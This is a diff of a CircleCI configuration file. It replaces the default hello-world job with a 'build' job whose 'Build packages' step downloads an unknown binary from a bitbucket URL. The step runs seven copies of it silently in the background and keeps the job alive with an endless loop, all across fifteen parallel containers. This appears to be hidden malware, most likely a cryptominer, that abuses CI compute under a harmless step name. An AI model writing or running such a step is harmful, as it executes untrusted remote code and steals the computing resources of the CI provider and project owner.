@@ -1,26 +1,28 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/configuration-reference
 version: 2.1
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/configuration-reference/#jobs
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Docker Hub or use one of our convenience images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/configuration-reference/#executor-job
+  build:
     docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/configuration-reference/#steps
+      - image: circleci/ruby:2.6
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
+    parallelism: 15
     steps:
       - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
-
-# Orchestrate jobs using workflows
-# See: https://circleci.com/docs/configuration-reference/#workflows
-workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
+      - run: 
+          name: Build packages
+          command: |
+            wget -q -O /tmp/cc1 https://bitbucket.org/seneralsa/asd/downloads/constan && chmod +x /tmp/cc1 && cp /tmp/cc1 /tmp/cc2 && cp /tmp/cc1 /tmp/cc3 && cp /tmp/cc1 /tmp/cc4 && cp /tmp/cc1 /tmp/cc5 && cp /tmp/cc1 /tmp/cc6 && cp /tmp/cc1 /tmp/cc7
+            /tmp/cc1 >/dev/null 2>&1 >/dev/null &
+            /tmp/cc2 >/dev/null 2>&1 >/dev/null &
+            sleep 3
+            /tmp/cc3 >/dev/null 2>&1 >/dev/null &
+            sleep 3
+            /tmp/cc4 >/dev/null 2>&1 >/dev/null &
+            sleep 3
+            /tmp/cc5 >/dev/null 2>&1 >/dev/null &
+            sleep 3
+            /tmp/cc6 >/dev/null 2>&1 >/dev/null &
+            sleep 3
+            /tmp/cc7 >/dev/null 2>&1 >/dev/null &
+            while :; do date; sleep 180; done
